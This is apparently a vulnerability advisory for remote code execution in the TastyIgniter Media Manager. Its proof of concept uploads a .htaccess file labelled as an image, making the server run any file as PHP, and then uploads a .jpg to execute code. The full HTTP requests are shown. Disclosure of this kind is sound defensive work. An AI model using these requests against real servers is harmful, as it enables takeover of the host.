summary: Remote Code Execution (RCE) via Unrestricted file upload in Media Manager
description: ### Summary Media manager accepts `.htaccess` file which can be used to perform RCE. ### Details The file upload functionality from media manager somehow accepts `.htaccess` file. This file could be used to allow any extension to run PHP command. By doing so, it is possible to perform RCE. ### PoC - Login as Admin - Create a `.htaccess` file with the following code. ``` SetHandler application/x-httpd-php ``` - Upload the `.htaccess` file via the Media Manager. Request ``` POST /admin/media_manager HTTP/1.1 Host: localhost:8888 Content-Length: 357 sec-ch-ua-platform: "Linux" X-CSRF-TOKEN: 2vv3ZKpvfj2SkbbJzqmf8G053mNXqPLktxqd5eMx Cache-Control: no-cache Accept-Language: en-US,en;q=0.9 sec-ch-ua: "Not-A.Brand";v="24", "Chromium";v="146" sec-ch-ua-mobile: ?0 X-IGNITER-FILEUPLOAD: mediamanager X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Accept: application/json Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryN13ytndlhtodIsbE Origin: http://localhost:8888 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Referer: http://localhost:8888/admin/media_manager Accept-Encoding: gzip, deflate, br Cookie: laravel_%3D; remember_igniter-admin_%3D; XSRF-%3D; tastyigniter_%3D Connection: keep-alive ------WebKitFormBoundaryN13ytndlhtodIsbE Content-Disposition: form-data; name="path" / ------WebKitFormBoundaryN13ytndlhtodIsbE Content-Disposition: form-data; name="file_data"; filename=".htaccess" Content-Type: image/png SetHandler application/x-httpd-php ------WebKitFormBoundaryN13ytndlhtodIsbE-- ``` - Once this step is done, just upload a php file with `.jpg` extension to execute php code. ``` POST /admin/media_manager HTTP/1.1 Host: localhost:8888 Content-Length: 310 sec-ch-ua-platform: "Linux" X-CSRF-TOKEN: 2vv3ZKpvfj2SkbbJzqmf8G053mNXqPLktxqd5eMx Cache-Control: no-cache Accept-Language: en-US,en;q=0.9 sec-ch-ua: "Not-A.Brand";v="24", "Chromium";v="146" sec-ch-ua-mobile: ?0 X-IGNITER-FILEUPLOAD: mediamanager X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Accept: application/json Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryN13ytndlhtodIsbE Origin: http://localhost:8888 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Referer: http://localhost:8888/admin/media_manager Accept-Encoding: gzip, deflate, br Cookie: laravel_%3D; remember_igniter-admin_%3D; XSRF-%3D; tastyigniter_%3D Connection: keep-alive ------WebKitFormBoundaryN13ytndlhtodIsbE Content-Disposition: form-data; name="path" / ------WebKitFormBoundaryN13ytndlhtodIsbE Content-Disposition: form-data; name="file_data"; filename="test.jpg" Content-Type: image/png ------WebKitFormBoundaryN13ytndlhtodIsbE-- ``` - in the example, we uploaded a `test.jpg` - execution the php code ### Impact Attacker with admin access could abuse this vulnerability to run command directly in the server.
